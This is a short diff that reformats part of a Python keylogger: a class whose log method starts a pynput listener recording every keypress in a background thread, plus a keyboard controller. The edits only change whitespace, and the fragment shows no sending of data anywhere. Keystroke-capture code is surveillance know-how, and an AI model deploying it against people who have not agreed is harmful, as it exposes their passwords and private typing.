@@ -55,12 +55,12 @@ class Keylogger:
             self.standardkey = True
 
     def log(self):
-           with Listener(on_press = self.key_press) as listener:
-            listener.join() # listening for keystrokes
+           with Listener(on_press=self.key_press) as listener:
+            listener.join()  # listening for keystrokes
 
 
 start = Keylogger()
-kThread = threading.Thread(target = start.log)
+kThread = threading.Thread(target=start.log)
 kThread.start()
 
 keyboard = Controller()
